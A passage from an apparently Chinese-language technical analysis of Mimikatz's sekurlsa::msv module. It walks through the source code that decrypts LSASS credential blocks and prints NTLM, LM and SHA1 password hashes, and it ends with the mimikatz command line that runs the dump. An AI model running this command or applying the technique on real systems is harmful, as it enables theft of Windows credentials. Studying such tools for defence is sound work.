        cbIV = sizeof(InitializationVector) / 2;
    }
    __try
    {
        status = cryptFunc(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, 0);
    }
    __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
    return status;
}
```

在这里由于 `Encrypt` 参数为 `FALSE`，因此将利用前文中提取出的初始化向量和密钥，对包含凭据的数据块进行解密。

### Print Hashed Credentials

解密后的内存结构由 `kuhl_m_sekurlsa_msv_helper()` 函数按照系统版本进行选择，这里选的就是 `MSV1_0_PRIMARY_CREDENTIAL_10_1607`。最后根据 `NtOwfPassword`、`LmOwfPassword` 和 `ShaOwPassword` 在该结构中的偏移量将它们的地址传入 `kull_m_string_wprintf_hex()` 函数，由 `kull_m_string_wprintf_hex()` 函数将它们转为字符串后打印出来，该函数定义如下。

```c++
void kull_m_string_wprintf_hex(LPCVOID lpData, DWORD cbData, DWORD flags)
{
    DWORD i, sep = flags &gt;&gt; 16;
    PCWCHAR pType = WPRINTF_TYPES[flags &amp; 0x0000000f];

    if((flags &amp; 0x0000000f) == 2)
        kprintf(L"\nBYTE data[] = {\n\t");

    for(i = 0; i &lt; cbData; i++)
    {
        kprintf(pType, ((LPCBYTE) lpData)[i]);
        if(sep &amp;&amp; !((i+1) % sep))
        {
            kprintf(L"\n");
            if((flags &amp; 0x0000000f) == 2)
                kprintf(L"\t");
        }
    }
    if((flags &amp; 0x0000000f) == 2)
        kprintf(L"\n};\n");
}
```

至此，整个 `sekurlsa::msv` 功能执行结束。

Let’s see it in action
======================

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::msv" exit
```

![image-20221218130633883](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-8b4427a731c27e976ecc23c8ff8bf660e0e5b5e4.png)